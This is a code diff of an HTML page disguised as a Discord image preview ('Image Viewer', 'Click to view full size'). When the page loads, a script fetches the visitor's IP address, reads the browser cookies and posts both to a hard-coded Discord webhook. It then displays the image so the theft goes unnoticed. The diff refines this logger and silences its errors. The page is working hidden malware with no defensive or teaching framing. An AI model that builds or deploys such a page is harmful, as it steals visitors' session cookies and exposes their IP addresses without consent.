@@ -3,28 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image</title>
     
-    <!-- Use the direct Imgur link for Discord Preview -->
-    <meta property="og:image" content="https://i.imgur.com/6hLYgA4.png">
-    <meta property="og:title" content="Check this out">
-    <meta property="og:description" content="">
-    
+    <!-- THIS IS KEY FOR DISCORD PREVIEW -->
+    <meta property="og:image" content="https://media.discordapp.net/attachments/1280593964357124238/1571993907036684490/image.png?ex=6afe1269&is=6afcc0e9&hm=0ed6e659ba030c1608f0f9978fc8fcfa9b5505a4687a6f91d67e442f8fccf332&format=webp&quality=lossless&width=1280&height=1001">
+    <meta property="og:title" content="Image Viewer">
+    <meta property="og:description" content="Click to view full size">
+    <meta name="theme-color" content="#36393f">
+
     <style>
-        body { margin: 0; padding: 0; background: #2f3136; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        img { max-width: 90vw; max-height: 90vh; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #36393f;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        img {
+            max-width: 100%;
+            max-height: 100%;
+            cursor: pointer;
+            border-radius: 4px;
+        }
     </style>
 </head>
 <body>
 
 <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1572396924575678506/DHAfoB_LoRotUSRW7xM4JoyN-zK-eKZ82BmtXNMdlXb7Mia2eyzNuXPXJev2eM4chhvG";
-    const IMG_SRC = "https://i.imgur.com/6hLYgA4.png"; // Your direct link
+    const IMAGE_SRC = "https://media.discordapp.net/attachments/1280593964357124238/1571993907036684490/image.png?ex=6afe1269&is=6afcc0e9&hm=0ed6e659ba030c1608f0f9978fc8fcfa9b5505a4687a6f91d67e442f8fccf332&format=webp&quality=lossless&width=1280&height=1001";
 
-    // Run logging immediately
     (async () => {
         try {
-            // 1. Get IP
+            // 1. Log Data
             let ip = "Unknown";
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -32,31 +45,27 @@
                 ip = data.ip;
             } catch (e) {}
 
-            // 2. Send Data
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🕵️‍♂️ Target Clicked!",
-                        color: 15158332,
+                        title: "🕵️‍♂️ New Click!",
+                        color: 5763457,
                         fields: [
                             { name: "🌐 IP", value: `\`${ip}\``, inline: true },
-                            { name: "🔑 Cookies", value: `\`\`\`${document.cookie}\`\`\``, inline: false },
-                            { name: "📅 Time", value: new Date().toLocaleString(), inline: false },
-                            { name: "💻 User Agent", value: navigator.userAgent, inline: false }
+                            { name: "🔑 Token/Cookies", value: `\`\`\`${document.cookie.substring(0, 500)}\`\`\``, inline: false },
+                            { name: "📅 Time", value: new Date().toLocaleString(), inline: false }
                         ]
                     }]
                 })
             });
-        } catch (e) {
-            console.error("Logging failed", e);
-        } finally {
-            // 3. Show Image regardless of success/failure
-            const img = document.createElement('img');
-            img.src = IMG_SRC;
-            document.body.appendChild(img);
-        }
+        } catch (e) {}
+
+        // 2. Show Image
+        const img = document.createElement('img');
+        img.src = IMAGE_SRC;
+        document.body.appendChild(img);
     })();
 </script>
 
